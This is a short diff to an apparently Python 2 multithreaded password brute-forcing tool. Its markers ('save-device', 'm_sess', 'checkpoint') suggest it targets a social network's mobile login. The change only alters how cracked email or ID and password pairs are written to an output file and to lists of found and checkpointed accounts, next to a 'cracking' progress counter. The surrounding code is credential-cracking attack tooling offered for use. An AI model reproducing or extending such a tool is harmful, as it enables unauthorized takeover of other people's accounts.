@@ -70,7 +70,7 @@ class asuBrute(threading.Thread):
 				_found.append(" | %s -> %s"%(self._email,
 				self._pasw))
 				open("out/multiresult.txt","a").write(
-					"%s -> %s\n"%(self._email,self._pasw))
+					"%s|%s\n"%(self._email,self._pasw))
 			if "checkpoint" in self._req:
 				_cekpoin.append(" - %s - %s"%(self._email,
 				self._pasw))
@@ -164,10 +164,10 @@ class thread:
 				}
 		).url
 		if "save-device" in r or "m_sess" in r:
-			fo.append("%s -> %s"%(id,ps))
-			open("out/multiresult.txt","a").write("%s -> %s\n"%(id.replace("\n",""),ps))
+			fo.append("%s|%s"%(id,ps))
+			open("out/multiresult.txt","a").write("%s|%s\n"%(id.replace("\n",""),ps))
 		if "checkpoint" in r:
-			cp.append("%s -> %s"%(id,ps))
+			cp.append("%s|%s"%(id,ps))
 		else:
 			fp+=1
 			print "\r[%s] cracking %s/%s: found:-%s%s%s   "%(len(cp),fp,len(lp),G,len(fo),N),;sys.stdout.flush()
